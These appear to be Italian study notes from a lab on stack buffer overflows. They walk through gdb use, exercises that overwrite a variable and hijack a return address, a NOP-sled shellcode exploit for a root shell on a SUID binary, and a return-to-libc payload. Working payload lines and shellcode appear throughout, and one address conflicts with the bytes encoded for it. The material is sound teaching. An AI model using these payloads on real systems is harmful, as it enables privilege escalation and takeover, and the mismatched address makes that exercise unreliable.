Lo STACK cresce verso il basso
L'HEAP cresce verso l'alto
L'architettura IA32 è dotata di 4 registri 32 bit general purpose: EAX, EBX, ECX, EDX

Ci sono poi due registri per la copia dei dati in memoria: 
- ESI (source) 
- EDI (destination)

Ci sono poi due registri per il controllo di flusso: 
- EIP (instruction ptr)
- EFLAGS (status register)

Ci sono poi due registri per la gestione dello stack: 
- ESP (punta all'ultima cella occupata dello stack)
- EBP (punta all'inizio dello stack locale, tutte le variabili locali sono referenziate relativamente a EBP)

L'obbiettivo dell'attaccante è capire come sia possibile utilizzare l'input edl programma, NON CONTROLLATO e NON VALIDATO per scrivere su indirizzi di memoria arbitrari.

Se  un attaccante scrive una stringa lunga più del dovuto viene superato l'EBP (4 byte) e poi si sovrascrive l'indirizzo di ritorno.

------------
GDB: strumento principale di DEBUGGING, è un programma che serve a testare altri programmi. In particolare mostra il frammento di codice macchina che genera il problema 

<< gdb FILE_ESEGUIBILE >>

Guardare la funzione main
<< disas main >>

La funzione vuln
<< disas vuln >>

Eseguire il programma con VALORE in input
<< run VALORE >>
------------
ES1) "write_val"
È semplicemente presente un buffer di 100 caratteri
Se scrivo ad esempio "run $(perl -e 'print "A"x20')" quindi 20 volte "A" allora la variabile "control" rimarrà "12345" che in esadecimale sarebbe 3039

Se scrivo invece "run $(perl -e 'print "A"x150')" ottengo SEGMENTATION FAULT e "control" avrà come valore 41414141 che equivale a 4 "A" in esadecimale

Ma dato che l'indirizzo deve essere 42434445 allora copro il buffer di 100 caratteri, poi EBP e infine l'indirizzo con "EDCB" :
run $(perl -e 'print "A"x104, "EDCB"') le lettere vanno scritte al contrato perché l'architettura è little endian
------------
ES2) "secret_function"
In questo caso nel codice è presente una struttura con due campi: 
- il primo contiene un buffer di 16 caratteri
- il secondo contiene una funzione void
Nel main viene messo come funzione la funzione "show_element" che altro non fa che printare una stringa passata come parametro.
È presente inoltre una funzione nascosta che printa una flag nascosta

Abbiamo bisogno di: scoprire come riscrivere l'indirizzo di ritorno, scoprire l'indirizzo della funzione nascosta
Runnando con gdb notiamo che 15 "A" non danno segmentation fault, mentre 16 si, allora dobbiamo scrivere 20 caratteri di cui gli ultimi 4 rappresentano l'indirizzo di ritorno che desideriamo.

Scoprire lo spazio di indirizzamento delle funzioni tramite gdb
<< info functions >>
Scopriamo quindi l'indirizzo della funzione secret: "0x565561b9"
Runniamo allora inserendo come indirizzo di ritorno proprio questo sempre con un'architettura little endian
"run $(perl -e 'print "A"x16,"\xad\x61\x55\x56"')" -> stampa la flag voluta
--------------
ES3) "secret_function_remote"
La differenza dall'esercizio 2 è che è presente una gets per prendere la stringa in ingresso, cioè da STDIN e non da riga di comando.
Quindi è possibile usare una pipe per alimentarlo con dati binari
"perl -e 'print "A"x16,"\xad\x61\x55\x56"' | ./es"
Questo esercizio va fatto con lo script del client e del server in connessione tramite porta 8000

-------------
ES4) "shellcode" 
L'obbiettivo è sfruttare la vulnerabilità per eseguire uno shellcode malevolo. Il codice è lo stesso di quello del primo esercizio (buffer da 100 caratteri)
Per rendere più visibile il risultato, bisogna attivare sull'eseguibile il bit SUID, in modo tale che, a causa della sua vulnerabilità sia possibile eseguire lo shellcode come utente privilegiato.
"chown root:root es"
"chmod u+s es"

La parte che finisce nello stack deve contenere il codice eseguibile, la parte che finisce come indirizzo di ritorno deve puntare al codice appena caricato nello stack.

Far puntare l'indirizzo di ritorno all'esatto indirizzo del nostro shellcode non è un'operazione banale, per ovviare a questo problema  si possono inserire prima dello shellcode una serie di istruzioni "NOP" (carattere "\x90") che sono "istruzioni neutre". 
L'idea è quindi quella di iniettare prima del nostro shellcode tanti NOP quanti più possibile, in modo da avere una lunga slitta verso lo shellcode

Provando si capisce che si inizia a sovrascrivere il codice di ritorno dal 113esimo byte
Quindi 112 byte di stack + 4 byte di indirizzo

In particolare, dato che lo shellcode è di 46 byte in questo caso avremo
66 byte NOP + 46 byte SHELLCODE + 4 byte INDIRIZZO DI RITORNO

L'idea è aumentare la probabilità che il programma "cada" nel posto giusto, se l'indirizzo di ritorno non punta precisamente all'inizio dello shellcode, ma cade in mezzo ai NOP, andrà avanti fino ad eseguire comunque lo shellcode.

Runniamo: 
run $(perl -e 'print
"\x90"x66,"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x3
1\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\
x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68",
"\x80\xd6\xff\xff"')

RETURN-TO-LIBC:
Invece di iniettare la shellcode nello stack, si riutilizzano funzioni già presenti nella libc (come system() e exit() ) e si passa /bin/sh come argomento.
libc è la libreria di sistema base che viene caricata con qualsiasi programma in Linux.

Per fare ciò
1) Inseriamo un breakpoint all'inizio del main (in gdb)
<< b *main >>

2) Trovo l'indirizzo di system()
<< p system >>

3) Trovo l'indirizzo di exit()
<< p exit >>

4) Trovo l'indirizzo della stringa "/bin/sh"
<< x/500s &esp" -> serve a guardare le variabili d'ambiente fra cui la SHELL che contiene "/bin/sh"

PAYLOAD FINALE: overflow + indirizzo system + indirizzo exit + variabile shell
run $(perl -e 'print
"\x90"x112,"\x0b\x10\xe1\xf7","\x50\x39\xe0\xf7",
"\xe2\xd6\xff\xff"')
